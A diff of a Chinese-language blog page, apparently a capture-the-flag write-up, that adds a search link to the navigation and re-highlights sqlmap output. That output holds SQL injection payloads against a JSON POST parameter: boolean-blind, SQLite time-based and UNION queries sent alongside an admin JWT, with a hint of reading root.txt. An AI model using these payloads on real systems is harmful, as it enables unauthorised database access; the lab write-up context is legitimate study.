@@ -86,6 +86,8 @@
        --><li><a href="/categories/">分类</a></li><!--
      --><!--
        --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
      -->
       </ul>
     </span>
@@ -290,15 +292,15 @@ sqlmap resumed the following injection point<span class="token punctuation">(</s
 Parameter: JSON <span class="token comment" spellcheck="true">#1* ((custom) POST)</span>
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"metadata":[&amp;#123;"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUzNTk3MjZ9.HBS0NOvcbvVwZM6FmHgq2r7wZbnvX7gW40dhhu51C1A"&amp;#125;],"data":[&amp;#123;"id":"573 AND 3475=3475"&amp;#125;]&amp;#125;</span>
+    Payload: <span class="token punctuation">{</span><span class="token string">"metadata"</span>:<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"token"</span>,<span class="token string">"value"</span><span class="token keyword">:</span><span class="token string">"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUzNTk3MjZ9.HBS0NOvcbvVwZM6FmHgq2r7wZbnvX7gW40dhhu51C1A"</span><span class="token punctuation">}</span><span class="token punctuation">]</span>,<span class="token string">"data"</span>:<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"id"</span><span class="token keyword">:</span><span class="token string">"573 AND 3475=3475"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
 
     Type: time-based blind
     Title: SQLite <span class="token operator">></span> 2.0 AND time-based blind <span class="token punctuation">(</span>heavy query<span class="token punctuation">)</span>
-    Payload: <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"metadata":[&amp;#123;"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUzNTk3MjZ9.HBS0NOvcbvVwZM6FmHgq2r7wZbnvX7gW40dhhu51C1A"&amp;#125;],"data":[&amp;#123;"id":"573 AND 7652=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))"&amp;#125;]&amp;#125;</span>
+    Payload: <span class="token punctuation">{</span><span class="token string">"metadata"</span>:<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"token"</span>,<span class="token string">"value"</span><span class="token keyword">:</span><span class="token string">"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUzNTk3MjZ9.HBS0NOvcbvVwZM6FmHgq2r7wZbnvX7gW40dhhu51C1A"</span><span class="token punctuation">}</span><span class="token punctuation">]</span>,<span class="token string">"data"</span>:<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"id"</span><span class="token keyword">:</span><span class="token string">"573 AND 7652=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
 
     Type: UNION query
     Title: Generic UNION query <span class="token punctuation">(</span>NULL<span class="token punctuation">)</span> - 3 columns
-    Payload: <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"metadata":[&amp;#123;"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUzNTk3MjZ9.HBS0NOvcbvVwZM6FmHgq2r7wZbnvX7gW40dhhu51C1A"&amp;#125;],"data":[&amp;#123;"id":"-5514 UNION ALL SELECT CHAR(113,122,120,112,113)||CHAR(102,105,82,81,100,65,112,80,67,90,106,104,111,71,86,83,117,112,122,76,113,107,98,75,103,118,74,115,69,116,82,109,76,102,88,115,65,79,100,83)||CHAR(113,107,120,122,113)-- wjne"&amp;#125;]&amp;#125;</span>
+    Payload: <span class="token punctuation">{</span><span class="token string">"metadata"</span>:<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"token"</span>,<span class="token string">"value"</span><span class="token keyword">:</span><span class="token string">"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUzNTk3MjZ9.HBS0NOvcbvVwZM6FmHgq2r7wZbnvX7gW40dhhu51C1A"</span><span class="token punctuation">}</span><span class="token punctuation">]</span>,<span class="token string">"data"</span>:<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"id"</span><span class="token keyword">:</span><span class="token string">"-5514 UNION ALL SELECT CHAR(113,122,120,112,113)||CHAR(102,105,82,81,100,65,112,80,67,90,106,104,111,71,86,83,117,112,122,76,113,107,98,75,103,118,74,115,69,116,82,109,76,102,88,115,65,79,100,83)||CHAR(113,107,120,122,113)-- wjne"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
 ---
 <span class="token punctuation">[</span>16:44:04<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> the back-end DBMS is SQLite
 back-end DBMS: SQLite
@@ -455,6 +457,8 @@ bash-5.0<span class="token comment" spellcheck="true"># cat root.txt</span>
         
           <li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li>
         
+          <li><a href="/search/">搜索</a></li>
+        
       </ul>
     </div>
 
@@ -516,6 +520,8 @@ bash-5.0<span class="token comment" spellcheck="true"># cat root.txt</span>
       --><li><a href="/categories/">分类</a></li><!--
     --><!--
       --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+    --><!--
+      --><li><a href="/search/">搜索</a></li><!--
     -->
       </ul>
       <ul>
